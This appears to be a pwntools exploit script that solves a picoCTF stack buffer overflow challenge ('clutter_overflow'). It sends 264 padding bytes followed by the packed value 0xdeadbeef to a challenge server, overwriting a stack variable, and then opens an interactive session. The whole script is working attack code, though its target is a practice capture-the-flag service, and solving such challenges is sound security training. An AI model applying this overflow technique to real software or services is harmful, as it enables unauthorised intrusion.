from pwn import *

offset = b'a'*264
payload = '0xdeadbeef'
payload = struct.pack('<Q', int(payload, base=16))
pid = 15971
s = remote("mars.picoctf.net",31890)
# s = process("./clutter_overflow/chal")
print(s.recvuntil("What do you see?"))
s.sendline(offset+payload)
s.interactive()
#gdb.attach(s, gdbscript='continue')
